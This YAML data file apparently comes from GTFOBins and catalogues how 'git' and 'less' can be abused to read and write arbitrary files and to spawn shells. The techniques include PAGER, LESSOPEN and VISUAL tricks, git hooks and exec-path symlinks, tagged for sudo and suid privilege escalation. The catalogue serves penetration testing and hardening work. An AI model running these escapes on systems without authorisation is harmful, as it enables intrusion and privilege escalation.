source_data:
  GTFOBins:
    raw:
      documents:
        git:
          functions:
            file-read:
            - code: git diff /dev/null /path/to/input-file
              comment: The read file content is displayed in `diff` style output format.
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            file-write:
            - code: git apply --unsafe-paths --directory / x.patch
              comment: 'The patch can be created locally by creating the file that will be written on
                the target using its absolute path:


                ```

                echo DATA >/path/to/input-file

                git diff /dev/null /path/to/input-file >x.patch

                ```'
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            inherit:
            - code: git help config
              contexts:
                sudo: null
                unprivileged: null
              from: less
            - code: 'git branch --help config

                !/bin/sh'
              comment: The help system can also be reached from any `git` command, e.g., `git branch`.
              contexts:
                sudo: null
                unprivileged: null
              from: less
            shell:
            - code: PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
              contexts:
                sudo: null
                unprivileged: null
            - code: 'git init .

                echo ''exec /bin/sh 0<&2 1>&2'' >.git/hooks/pre-commit

                chmod +x .git/hooks/pre-commit

                git -C . commit --allow-empty -m x'
              comment: Git hooks are merely shell scripts and in the following example the hook associated
                to the `pre-commit` action is used. Any other hook will work, just make sure to be able
                perform the proper action to trigger it. An existing repository can also be used, and
                moving into the directory works too.
              contexts:
                sudo: null
                unprivileged: null
            - code: 'ln -s /bin/sh git-x

                git --exec-path=. x'
              contexts:
                sudo: null
                suid:
                  code: 'ln -s /bin/sh git-x

                    git --exec-path=. x -p'
                  shell: false
                unprivileged: null
        less:
          functions:
            command:
            - code: 'cp /path/to/command ~/.lessfilter

                less /etc/hosts'
              contexts:
                unprivileged: null
            - code: 'LESSOPEN=''/path/to/command # %s'' less /etc/hosts'
              contexts:
                sudo: null
                unprivileged: null
            file-read:
            - code: less /path/to/input-file
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            - code: 'less /etc/hosts

                :e /path/to/input-file'
              comment: This can be used to read another file, e.g., when invoked as a pager with some
                fixed content.
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            - code: 'LESSOPEN=''echo /path/to/input-file # %s'' less /etc/hosts'
              comment: This can be used to read another file.
              contexts:
                sudo: null
                unprivileged: null
            file-write:
            - code: 'echo DATA | less

                s/path/to/output-file

                q'
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            inherit:
            - code: 'less /etc/hosts

                v'
              contexts:
                sudo: null
                suid: null
                unprivileged: null
              from: vi
            shell:
            - code: 'less /etc/hosts

                !/bin/sh'
              contexts:
                sudo: null
                suid:
                  shell: true
                unprivileged: null
            - code: 'LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts

                reset'
              comment: The optional `reset` command is needed to receive the echo back of the typed keystrokes.
              contexts:
                sudo: null
                unprivileged: null
            - code: 'VISUAL=''/bin/sh -s --'' less /etc/hosts

                v'
              contexts:
                sudo: null
                unprivileged: null
